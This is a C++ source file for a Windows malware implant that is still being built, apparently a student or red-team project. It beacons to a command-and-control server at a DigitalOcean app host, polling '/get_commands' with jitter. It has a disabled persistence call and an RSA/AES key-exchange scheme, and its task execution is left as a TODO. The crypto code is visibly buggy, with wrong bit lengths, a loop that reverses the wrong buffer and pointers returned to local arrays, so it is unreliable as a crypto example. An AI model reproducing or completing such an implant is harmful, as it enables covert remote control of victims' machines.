/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <future>
#include <cmath>
#include <string>
#include "persist.h"
#include <algorithm>
#include <cstdint>
#include <span>
#include <cstddef>
#include <cstdlib>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

// current compile line is - g++ implant.cpp persist.cpp -lwinhttp -lbscrypt -static -o implant.exe

#define SERVERNAME "placeholder"
#define SLEEP 60000 
size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}

void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}
/*
BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput, ULONG pbinputsize)
{
    BCRYPT_ALG_HANDLE rsahandle;
    BCryptOpenAlgorithmProvider(&rsahandle, BCRYPT_RSA_ALGORITHM, NULL, 0);
        BCRYPT_KEY_HANDLE outro = new BCRYPT_KEY_HANDLE;
        const char* mod="bbcfaed8f3999fef8dca09a7f9a1b9d08017cb55ffcd589d1c8e4e967cf5745ba176ac7c6164f0b9d90b73023381e43d5980db866e3c3400ce6d27b1b4f52a8b1893d7ab7c6457768177b870c38f78992e4889f598c40bb59e3bc1f3df367427d6ec5c6413e7a8ec5f07928e2d79edbc3fdc50d4da379fc09934206f74c1ebb5";
        unsigned char* modbytes=hexstr_to_char(mod);
        _BCRYPT_RSAKEY_BLOB rsaheaderblob;
        rsaheaderblob.Magic=BCRYPT_RSAPUBLIC_MAGIC;
        rsaheaderblob.BitLength=1036;
        rsaheaderblob.cbPublicExp=4;
        rsaheaderblob.cbModulus=256;  
        void* truekey=(void*)malloc(sizeof(_BCRYPT_RSAKEY_BLOB)+1036);
    NTSTATUS status=BCryptImportKeyPair(rsahandle, NULL, BCRYPT_RSAPUBLIC_BLOB, &outro, pbinnput, pbinputsize, BCRYPT_NO_KEY_VALIDATION);
    printf("%li",status);
    std::cout<<"\n";    
    printf("%s","That was status for rsa key. \n");
    return outro;
}
*/
unsigned char* hexstr_to_char(const char* hexstr)
{
    size_t len = strlen(hexstr);
    size_t final_len = len / 2;
    unsigned char* chrs = (unsigned char*)malloc((final_len+1) * sizeof(*chrs));
    for (size_t i=0, j=0; j<final_len; i+=2, j++)
        chrs[j] = (hexstr[i] % 32 + 9) % 25 * 16 + (hexstr[i+1] % 32 + 9) % 25;
    chrs[final_len] = '\0';
    return chrs;
}

unsigned char reverse(unsigned char b) {
   b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
   b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
   b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
   return b;
}


BCRYPT_KEY_HANDLE importrsakey()
{
    BCRYPT_ALG_HANDLE rsahandle;
    BCryptOpenAlgorithmProvider(&rsahandle, BCRYPT_RSA_ALGORITHM, NULL, 0);
        BCRYPT_KEY_HANDLE outro = new BCRYPT_KEY_HANDLE;
        
        const char* mod="bbcfaed8f3999fef8dca09a7f9a1b9d08017cb55ffcd589d1c8e4e967cf5745ba176ac7c6164f0b9d90b73023381e43d5980db866e3c3400ce6d27b1b4f52a8b1893d7ab7c6457768177b870c38f78992e4889f598c40bb59e3bc1f3df367427d6ec5c6413e7a8ec5f07928e2d79edbc3fdc50d4da379fc09934206f74c1ebb5";
        
        BYTE* modbytes=(BYTE*)hexstr_to_char(mod);
        const char* defexponent="010001";
        BYTE* defaultExponent=(BYTE*)hexstr_to_char(defexponent);
       _BCRYPT_RSAKEY_BLOB rsaheaderblob;
        rsaheaderblob.Magic=BCRYPT_RSAPUBLIC_MAGIC;
        rsaheaderblob.BitLength=1048;
        rsaheaderblob.cbPublicExp=3;
        rsaheaderblob.cbModulus=128;  
        //std::cout<<sizeof(_BCRYPT_RSAKEY_BLOB);   
        BYTE* exponentrev=(BYTE*)malloc(3);
        for(int a=0;a<3;a++){
            exponentrev[a]=reverse(defaultExponent[3-a]);
        }
        BYTE* modulusrev=(BYTE*)malloc(128);
        for(int b=0;b<128;b++){
            modulusrev[b]=reverse(defaultExponent[3-b]);
        }
        BYTE* otherrev;
        PUCHAR truekey=(PUCHAR)malloc(sizeof(_BCRYPT_RSAKEY_BLOB)+131);
        memcpy_s(truekey,155,&rsaheaderblob,sizeof(_BCRYPT_RSAKEY_BLOB));
        memcpy_s(truekey+sizeof(_BCRYPT_RSAKEY_BLOB),155,defaultExponent,3);
        memcpy_s(truekey+sizeof(_BCRYPT_RSAKEY_BLOB)+3,155,modbytes,128);
        for(int i=0;i<24;i+=4){
            printf("%lu",truekey[i]);
            printf("\n");
        }
        std::cout<<"\n";
        for(int i=0;i<3;i++){
            printf("%x",truekey[24+i]);
        }
        std::cout<<"\n";
        for(int i=0;i<128;i++){
            printf("%x",truekey[i+24+3]);
        }

    NTSTATUS status=BCryptImportKeyPair(rsahandle, NULL, BCRYPT_RSAPUBLIC_BLOB, &outro, truekey, 155, BCRYPT_NO_KEY_VALIDATION);
    printf("%li",status);
    std::cout<<"\n";    
    printf("%s","That was status for rsa key. \n");
    return outro;
}




PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle, PUCHAR symkey, ULONG symkeysize)
{
    // Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
    ULONG encbuffersize;
    NTSTATUS status = BCryptEncrypt(rsakeyhandle, symkey, symkeysize,NULL,NULL,0,NULL,0,&encbuffersize,0);
    printf("%li",status);
    std::cout<<"HELLO PLEASE \n";
    PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
    if (encbuffer == NULL)
    {
        printf("failed to allocate memory for blindedFEKBuffer\n");
    }
    BCryptEncrypt(rsakeyhandle, symkey, symkeysize, NULL, NULL, 0, encbuffer, encbuffersize, &encbuffersize, 0);
    printf("%lu",encbuffersize);
    std::cout<<"\n";
    return encbuffer;
}
char *getsecret()
{
    char *secret = (char *)malloc(8);
    std::string alphabet = "abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    unsigned int ms = std::time(nullptr);
    double mod = 61;
    srand(ms);
    for (int i = 0; i < 8; i++)
    {
        if (i == 4)
        {
            srand(ms + 1);
        }
        int randomvalue = std::fmod(rand(), mod);
        secret[i] = alphabet[randomvalue];
    }
    return secret;
}

BCRYPT_KEY_HANDLE newsymkey()
{
    BCRYPT_ALG_HANDLE ahandle;
    BCRYPT_KEY_HANDLE symkeyhandle = new BCRYPT_KEY_HANDLE;
    ULONG symkeypropertylen;
    ULONG bytescopied;
    BCryptOpenAlgorithmProvider(&ahandle, BCRYPT_AES_GMAC_ALGORITHM, NULL, 0);
    BCryptGetProperty(ahandle, BCRYPT_KEY_LENGTH, NULL, 0, &symkeypropertylen, 0);
    PUCHAR symkeylen = (PUCHAR)malloc(symkeypropertylen);
    BCryptGetProperty(ahandle, BCRYPT_KEY_LENGTH, symkeylen, symkeypropertylen, &bytescopied, 0);
    char *secret = getsecret();
    BCryptGenerateSymmetricKey(ahandle, &symkeyhandle, NULL, 0, (PUCHAR)secret, 8, 0);
    free(symkeylen);
    return symkeyhandle;
}

ULONG getkeysize(BCRYPT_KEY_HANDLE symkeyhandle){
    //Get datablob required size
    ULONG blobsize;
    BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&blobsize,0);
    return blobsize;
    
}

BLOB* getkeytext(BCRYPT_KEY_HANDLE symkeyhandle,ULONG blobsize){
    //Make blob, export key to blob
    BLOB* keyblob=(BLOB*)malloc(blobsize);
    BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)keyblob,blobsize,&blobsize,0);
    return keyblob;
}

std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id)
{
    // Used Windows documentation for every function
    int temp = 0;
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    if (implant_id > 10)
    {
        temp = 2;
    }
    else
    {
        temp = 1;
    }
    int length = 7 + temp;
    char postdata[11];
    sprintf(postdata, "{\"id\":%d}", implant_id);

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
    LPCWSTR fqdnptr = fqdn_wstring.c_str();

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(fqdnptr, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, fqdnptr, port, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}

// -> PARSE TASK IS FINISHED IN PARSE.CPP
// auto parseTasks(auto toParse){

// return 1;
// }

// TODO
//  auto executeTasks(auto tasks){

//     return 1;
// }

std::string getTasks(int implant_id)
{
    std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
    return item;
}


bool isPrime(int number)
{
    for (int a = 2; a < number; a++) {
        if (number % a == 0) {
            return false;
        }
    }
    return true;
}

int randprime()
{
    while(true) {
        int r = rand();
        if(isPrime(r)) return r;
        }
}


void runLoop(int implant_id)
{
    int jitter;
    int i=0;    
    BCRYPT_KEY_HANDLE symkey=newsymkey();
    ULONG symkeysize=getkeysize(symkey);
    //char* encbuffer=rsaEncrypt(rsakey,);
    //register()
    //PERSISTANCE ONCE IMPLANT HAS BEEN MADE
    // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
    //persist_execution();
    while (true)
    {
        try
        {
            i+=1;
            if(i==40){
                newsymkey();
                i=0;
            }

            // WAS FOR TESTING PURPOSES - CHANGE LATER
            std::string getting = getTasks(implant_id);
            jitter = rand() * 10;
            Sleep(SLEEP + jitter);
            std::cout << getting << std::endl;
            // WHEN WE GET THE FORMAT, THEN PARSE
            // THEN AFTER PARSE FEED INTO EXECUTE

            // const auto serverResponse = std::async(std::launch::async, getTasks);
            // auto parsedTasks = parseTasks(serverResponse.get());
            // auto success = executeTasks(parsedTasks);
        }
        catch (const std::exception &e)
        {
            printf("\nError in runLoop: %s\n", e.what());
        }

        // SET SLEEP HERE
    }
}

// INITIALLY MADE FOR RANDOM HEX - WE CAN CHANGE TO RANDOM INT
// IF WE CONTINUE TO USE RANDOM HEX - HTTP REQUEST NEEDS TO BE CHANGED

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

// INITIALLY MADE TO CREATE A POINTER TO AN IMPLANT ID STRING
// NOT SURE IF STILL NEEDED
char *make_base_payload(char *implant_id)
{
    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}


int main(int argc, char *argv[])
{
    
    BCRYPT_KEY_HANDLE rsakey=importrsakey();
    //BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)rsakeyblob,(ULONG)562);
    BCRYPT_KEY_HANDLE symkey=newsymkey();
    ULONG symkeysize=getkeysize(symkey);
    BLOB* symkeytext=getkeytext(symkey,symkeysize);
    PUCHAR encbuffer=rsaEncrypt(rsakey,(PUCHAR) symkeytext,symkeysize);
    for(int i=0;i<100;i++){
        printf("%x",encbuffer[i]);
    } 
    return 0;
    
}

/* Code not used


LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"GET",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    NULL,
                    0,
                    0,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        LPSTR returnbuffer=new char[bytesneeded+1];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                bytesneeded+1,
                                NULL);
                                if(dataread==TRUE){
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
{
    DWORD datalen = strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (httpsession != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {


                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                    printf("YOU SET HEADER");
                }


                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if (response == true)
                    {
                        DWORD bytesneeded;
                        BOOL query = WinHttpQueryDataAvailable(
                            request,
                            &bytesneeded);
                        LPSTR returnbuffer = new char[bytesneeded + 1];
                        if (query == TRUE)
                        {
                            if (returnbuffer)
                            {
                                ZeroMemory(returnbuffer, bytesneeded + 1);
                                BOOL dataread = WinHttpReadData(
                                    request,
                                    returnbuffer,
                                    bytesneeded + 1,
                                    NULL);
                                if (dataread == TRUE)
                                {
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
 Code not used */
